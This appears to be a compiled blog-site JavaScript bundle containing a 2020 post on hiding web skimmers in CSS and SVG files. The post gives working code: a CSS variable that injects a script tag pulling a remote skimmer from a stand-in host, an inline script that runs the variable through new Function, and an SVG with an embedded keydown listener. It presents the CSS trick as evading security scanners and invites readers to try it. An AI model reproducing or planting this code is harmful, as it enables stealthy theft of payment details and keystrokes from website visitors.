"use strict";(self.webpackChunkmydatahack_blog_site=self.webpackChunkmydatahack_blog_site||[]).push([[3999],{3933:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>m,frontMatter:()=>a,metadata:()=>r,toc:()=>d});var s=t(74848),i=t(28453);const a={sidebar_position:21},o="Executing Web Skimmers Inside CSS and SVG files",r={id:"Web/Frontend/web-skimmer-inside.css",title:"Executing Web Skimmers Inside CSS and SVG files",description:"A web skimmer is a piece of malicious JS code embedded in web payment pages to skim customer\u2019s payment information. There are a few tricks to embed malicious scripts. In this post, we\u2019ll discuss how it can be done in CSS file and SVG file as well as what works and what doesn\u2019t.",source:"@site/docs/Web/Frontend/21.web-skimmer-inside.css.md",sourceDirName:"Web/Frontend",slug:"/Web/Frontend/web-skimmer-inside.css",permalink:"/mydatahack-old-blog/mydatahack-old-blog/Web/Frontend/web-skimmer-inside.css",draft:!1,unlisted:!1,tags:[],version:"current",sidebarPosition:21,frontMatter:{sidebar_position:21},sidebar:"tutorialSidebar",previous:{title:"What You May Not Know About Enzyme's Mount Method",permalink:"/mydatahack-old-blog/mydatahack-old-blog/Web/Frontend/enzyme-mount-method"},next:{title:"Extending JQuery Interface for Bootstrap support \u2013 TypeScript",permalink:"/mydatahack-old-blog/mydatahack-old-blog/Web/Frontend/jquery-bootstrap-ts"}},c={},d=[];function l(e){const n={code:"code",h1:"h1",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"executing-web-skimmers-inside-css-and-svg-files",children:"Executing Web Skimmers Inside CSS and SVG files"}),"\n",(0,s.jsx)(n.p,{children:"A web skimmer is a piece of malicious JS code embedded in web payment pages to skim customer\u2019s payment information. There are a few tricks to embed malicious scripts. In this post, we\u2019ll discuss how it can be done in CSS file and SVG file as well as what works and what doesn\u2019t."}),"\n",(0,s.jsx)(n.p,{children:"Embedding script in CSS"}),"\n",(0,s.jsx)(n.p,{children:"It is a new and interesting way to inject a script into the page from CSS. We can take advantage of CSS variables. In short, we will have a JS code to pull an external js file as a CSS variable and another small piece of JS to execute this JS code disguised as the variable. Web security tools usually scan JS code, not CSS. This method is more likely to go undetected."}),"\n",(0,s.jsx)(n.p,{children:"We first define a global CSS variable to create a script tag that pulls the script. Then, you can inject another script to execute the variable through getComputedStyle."}),"\n",(0,s.jsx)(n.p,{children:"Global Css file with Css variable to pull a skimmer."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-css",children:':root {\n  --script: setTimeout(\n    function() {var head=document.getElementById("test") ; var script =\n      document.createElement("script") ; script.src= "https://my.skimmer.com/js/web-skimmer/test2.js"\n      ; head.appendChild(script) ;},\n    2000\n  );\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"This code can be embedded in another JavaScript. It executes the script in the CSS variable to the page."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:'<script type="text/javascript">\n  new Function(\n    getComputedStyle(document.documentElement)?.getPropertyValue("--script")\n  )();\n<\/script>\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Inside the source file, we can go nuts! ",(0,s.jsx)(n.code,{children:"web-skimmer/test2.js"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-js",children:"window.addEventListener('DOMContentLoaded', () => {\n  console.log('Skimmer in CSS executed');\n  document.documentElement.addEventListener('keydown',function(e){\n  console.log('Logging key from svg!');\n  console.log(e.keyCode);\n});\n"})}),"\n",(0,s.jsx)(n.p,{children:"Embedding script in SVG"}),"\n",(0,s.jsx)(n.p,{children:"This one is a more classic way of embedding a malicious script. SVG is basically XML, which means you can add a script tag and wrap the code with CDATA. You can inject the file to the page through an embed tag."}),"\n",(0,s.jsx)(n.p,{children:"Note that this doesn\u2019t work with an img tag, a CSS background-image url or link tag as a favicon. When SVG is used in an image context, the browser emulates a raster image that is not scriptable."}),"\n",(0,s.jsx)(n.p,{children:"Script can be added to the svg file. This has JS code, but it can be just pulled from somewhere as in the example above."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-svg",children:'<svg version="1.1" xmlns="http://www.w3.org/2000/svg" height="210" width="500">\n  <polygon\n    points="100,10 40,198 190,78 10,78 160,198"\n    style="fill:lime;stroke:purple;stroke-width:5;fill-rule:nonzero;"\n  />\n  <script type="text/javascript">\n    <![CDATA[ window.addEventListener(\'DOMContentLoaded\', () => {\n    console.log(\'JS in SVG file executed\');\n    document.documentElement.addEventListener(\'keydown\',function(e){\n    console.log(\'Logging key from svg!\'); console.log(e.keyCode); }); }) ]]>\n  <\/script>\n</svg>\n'})}),"\n",(0,s.jsx)(n.p,{children:"Then, inject it through an embed tag."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:'<embed src="img/web-skimmer/star.svg" alt="star" type="image/svg+xml" />\n'})}),"\n",(0,s.jsx)(n.p,{children:"It doesn't work as CSS background, img tag or favicon link."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-css",children:'.load-js {\n  background-image: url("../../js/web-skimmer/star.js");\n}\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:'<head>\n  <link rel="icon" href="img/web-skimmer/favicon.svg" />\n</head>\n<body>\n  <img src="img/web-skimmer/star.svg" alt="star" type="image/svg+xml" />\n</body>\n'})}),"\n",(0,s.jsx)(n.p,{children:"That\u2019s it. If you are interested, I recommend you to try it out by yourself and see how easy it is to hide your script."}),"\n",(0,s.jsx)(n.p,{children:"(2020-12-23)"})]})}function m(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>r});var s=t(96540);const i={},a=s.createContext(i);function o(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);